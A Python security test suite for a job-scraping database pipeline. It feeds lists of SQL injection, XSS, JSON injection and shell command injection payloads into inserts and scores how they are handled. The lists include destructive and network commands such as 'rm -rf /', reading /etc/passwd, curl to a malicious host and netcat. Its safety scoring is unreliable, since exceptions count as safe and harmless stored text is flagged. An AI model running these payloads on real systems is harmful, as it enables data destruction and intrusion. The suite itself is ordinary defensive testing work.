#!/usr/bin/env python3
"""
APIFY Security Testing Suite
Tests for SQL injection, XSS, command injection, and other security vulnerabilities
in the APIFY → raw_job_scrapes pipeline
"""

import json
import uuid
from datetime import datetime
from modules.scraping.scrape_pipeline import ScrapeDataPipeline
from modules.database.database_manager import DatabaseManager

class APIfySecurityTester:
    def __init__(self):
        self.pipeline = ScrapeDataPipeline()
        self.db = DatabaseManager()
        self.test_results = []
    
    def run_all_security_tests(self):
        """Run comprehensive security tests on APIFY pipeline"""
        print("=== APIFY SECURITY TESTING SUITE ===")
        print("Testing APIFY → raw_job_scrapes pipeline security")
        
        # SQL Injection Tests
        self.test_sql_injection_attacks()
        
        # XSS Tests
        self.test_xss_attacks()
        
        # Command Injection Tests
        self.test_command_injection()
        
        # JSON Injection Tests
        self.test_json_injection()
        
        # Data Sanitization Tests
        self.test_data_sanitization()
        
        # Generate security report
        self.generate_security_report()
        
        return self.test_results
    
    def test_sql_injection_attacks(self):
        """Test various SQL injection attack patterns"""
        print("\n1. SQL INJECTION TESTS:")
        
        sql_payloads = [
            # Classic SQL injection
            "'; DROP TABLE raw_job_scrapes; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            
            # PostgreSQL specific injections
            "'; INSERT INTO raw_job_scrapes (scrape_id) VALUES ('hacked'); --",
            "' OR 1=1; UPDATE raw_job_scrapes SET raw_data='{}' --",
            
            # Blind SQL injection
            "' AND (SELECT COUNT(*) FROM raw_job_scrapes) > 0 --",
            "'; SELECT pg_sleep(5); --",
            
            # Second-order injection
            "admin'--",
            "' OR SUBSTRING(version(),1,1)='P' --"
        ]
        
        for i, payload in enumerate(sql_payloads, 1):
            try:
                # Test in job title
                malicious_data = {
                    'positionName': payload,
                    'company': 'Test Company',
                    'location': 'Edmonton, AB',
                    'description': 'Test description',
                    'id': f'sql-test-{i}'
                }
                
                # Attempt to insert malicious data
                result = self._test_malicious_insert(malicious_data, f"SQL injection #{i}")
                self.test_results.append({
                    'test_type': 'SQL Injection',
                    'payload': payload,
                    'result': result,
                    'safe': result['safe']
                })
                
                print(f"   Test {i}: {'✅ SAFE' if result['safe'] else '❌ VULNERABLE'} - {payload[:30]}...")
                
            except Exception as e:
                print(f"   Test {i}: ✅ BLOCKED - Exception caught: {str(e)[:50]}...")
                self.test_results.append({
                    'test_type': 'SQL Injection',
                    'payload': payload,
                    'result': {'safe': True, 'blocked_by': 'exception'},
                    'safe': True
                })
    
    def test_xss_attacks(self):
        """Test XSS attack patterns in job data"""
        print("\n2. XSS ATTACK TESTS:")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
        ]
        
        for i, payload in enumerate(xss_payloads, 1):
            try:
                malicious_data = {
                    'positionName': f'Marketing Manager {payload}',
                    'company': f'Company {payload}',
                    'location': 'Edmonton, AB',
                    'description': f'Job description with {payload}',
                    'id': f'xss-test-{i}'
                }
                
                result = self._test_malicious_insert(malicious_data, f"XSS attack #{i}")
                self.test_results.append({
                    'test_type': 'XSS',
                    'payload': payload,
                    'result': result,
                    'safe': result['safe']
                })
                
                print(f"   Test {i}: {'✅ SAFE' if result['safe'] else '❌ VULNERABLE'} - {payload[:30]}...")
                
            except Exception as e:
                print(f"   Test {i}: ✅ BLOCKED - Exception: {str(e)[:50]}...")
    
    def test_command_injection(self):
        """Test command injection attacks"""
        print("\n3. COMMAND INJECTION TESTS:")
        
        cmd_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(uname -a)",
            "; curl malicious-site.com",
            "| nc -l 4444",
            "&& python -c 'import os; os.system(\"id\")'"
        ]
        
        for i, payload in enumerate(cmd_payloads, 1):
            try:
                malicious_data = {
                    'positionName': f'Developer {payload}',
                    'company': 'Tech Corp',
                    'location': f'Edmonton {payload}',
                    'description': f'Job requiring {payload} skills',
                    'id': f'cmd-test-{i}'
                }
                
                result = self._test_malicious_insert(malicious_data, f"Command injection #{i}")
                print(f"   Test {i}: {'✅ SAFE' if result['safe'] else '❌ VULNERABLE'} - {payload[:30]}...")
                
            except Exception as e:
                print(f"   Test {i}: ✅ BLOCKED - Exception: {str(e)[:50]}...")
    
    def test_json_injection(self):
        """Test JSON injection attacks"""
        print("\n4. JSON INJECTION TESTS:")
        
        json_payloads = [
            '{"malicious": "data"}',
            '"}, {"injected": "payload"',
            '\\", \\"injected\\": \\"value\\"',
            '\\"}, {\\"exploit\\": \\"attempt\\"',
            '", "overwrite": "field"}',
        ]
        
        for i, payload in enumerate(json_payloads, 1):
            try:
                malicious_data = {
                    'positionName': f'Analyst{payload}',
                    'company': f'Corp{payload}',
                    'location': 'Edmonton, AB',
                    'description': f'Description with {payload}',
                    'id': f'json-test-{i}',
                    'malicious_field': payload
                }
                
                result = self._test_malicious_insert(malicious_data, f"JSON injection #{i}")
                print(f"   Test {i}: {'✅ SAFE' if result['safe'] else '❌ VULNERABLE'} - {payload[:30]}...")
                
            except Exception as e:
                print(f"   Test {i}: ✅ BLOCKED - Exception: {str(e)[:50]}...")
    
    def test_data_sanitization(self):
        """Test data sanitization and validation"""
        print("\n5. DATA SANITIZATION TESTS:")
        
        # Test extremely long strings (buffer overflow)
        long_string = "A" * 10000
        
        # Test unicode and special characters
        unicode_test = "Test ñ 中文 🔥 \x00\x01\x02"
        
        # Test null bytes
        null_bytes = "Test\x00\x01\x02\x03"
        
        test_cases = [
            ("Long string", long_string),
            ("Unicode chars", unicode_test),
            ("Null bytes", null_bytes),
            ("Empty string", ""),
            ("Only spaces", "   "),
            ("HTML entities", "&lt;script&gt;alert()&lt;/script&gt;"),
            ("URL encoded", "%3Cscript%3Ealert%28%29%3C%2Fscript%3E")
        ]
        
        for i, (test_name, payload) in enumerate(test_cases, 1):
            try:
                malicious_data = {
                    'positionName': payload,
                    'company': 'Test Company',
                    'location': 'Edmonton, AB',
                    'description': payload,
                    'id': f'sanitize-test-{i}'
                }
                
                result = self._test_malicious_insert(malicious_data, f"Sanitization test: {test_name}")
                print(f"   Test {i}: {'✅ SAFE' if result['safe'] else '❌ ISSUE'} - {test_name}")
                
            except Exception as e:
                print(f"   Test {i}: ✅ HANDLED - {test_name}: {str(e)[:50]}...")
    
    def _test_malicious_insert(self, malicious_data, test_description):
        """Attempt to insert malicious data and check for vulnerabilities"""
        try:
            # Record initial state
            initial_count = self.db.execute_query("SELECT COUNT(*) FROM raw_job_scrapes")[0][0]
            
            # Attempt malicious insert
            scrape_id = self.pipeline.insert_raw_scrape(
                source_website='security-test',
                source_url='https://test.com/security',
                raw_data=malicious_data,
                scraper_used='security-tester',
                scraper_run_id='security-test-suite'
            )
            
            # Check if data was inserted safely
            final_count = self.db.execute_query("SELECT COUNT(*) FROM raw_job_scrapes")[0][0]
            
            if final_count == initial_count + 1:
                # Data was inserted - check if it's sanitized
                inserted_data = self.db.execute_query(
                    "SELECT raw_data FROM raw_job_scrapes WHERE scrape_id = %s",
                    (scrape_id,)
                )
                
                if inserted_data:
                    stored_data = inserted_data[0][0]
                    
                    # Check if malicious content is properly stored (not executed)
                    is_safe = self._verify_data_safety(stored_data, malicious_data)
                    
                    return {
                        'safe': is_safe,
                        'inserted': True,
                        'scrape_id': scrape_id,
                        'description': test_description
                    }
                
            return {'safe': False, 'inserted': False, 'error': 'Unexpected behavior'}
            
        except Exception as e:
            # Exception during insert - likely blocked by security measures
            return {
                'safe': True,
                'inserted': False,
                'blocked_by': 'exception',
                'error': str(e),
                'description': test_description
            }
    
    def _verify_data_safety(self, stored_data, original_data):
        """Verify that stored data doesn't contain active malicious content"""
        try:
            # Parse stored JSON
            parsed_data = json.loads(stored_data) if isinstance(stored_data, str) else stored_data
            
            # Check that malicious scripts are not executable
            for field, value in parsed_data.items():
                if isinstance(value, str):
                    # Check for active script tags
                    if '<script>' in value.lower() and '</script>' in value.lower():
                        return False  # Potentially dangerous
                    
                    # Check for SQL injection remnants
                    if any(sql_keyword in value.lower() for sql_keyword in ['drop table', 'union select', 'delete from']):
                        return False  # Potentially dangerous
            
            return True  # Data appears to be safely stored
            
        except Exception:
            return False  # Unable to verify safety
    
    def generate_security_report(self):
        """Generate comprehensive security test report"""
        print("\n=== SECURITY TEST REPORT ===")
        
        total_tests = len(self.test_results)
        safe_tests = sum(1 for test in self.test_results if test['safe'])
        vulnerable_tests = total_tests - safe_tests
        
        print(f"Total security tests: {total_tests}")
        print(f"Safe/Blocked: {safe_tests}")
        print(f"Potentially vulnerable: {vulnerable_tests}")
        
        if vulnerable_tests == 0:
            print("\n🛡️  SECURITY STATUS: EXCELLENT")
            print("   All injection attempts were safely handled")
            print("   APIFY → raw_job_scrapes pipeline appears secure")
        else:
            print(f"\n⚠️  SECURITY STATUS: {vulnerable_tests} VULNERABILITIES FOUND")
            print("   Manual review recommended for vulnerable tests")
            
            # Show vulnerable tests
            for test in self.test_results:
                if not test['safe']:
                    print(f"   VULNERABLE: {test['test_type']} - {test['payload'][:50]}...")
        
        return {
            'total_tests': total_tests,
            'safe_tests': safe_tests,
            'vulnerable_tests': vulnerable_tests,
            'security_score': round((safe_tests / total_tests) * 100, 1) if total_tests > 0 else 0
        }

def main():
    """Run security testing suite"""
    tester = APIfySecurityTester()
    results = tester.run_all_security_tests()
    
    print(f"\n=== FINAL SECURITY ASSESSMENT ===")
    report = tester.generate_security_report()
    print(f"Security Score: {report['security_score']}%")
    
    return report

if __name__ == "__main__":
    main()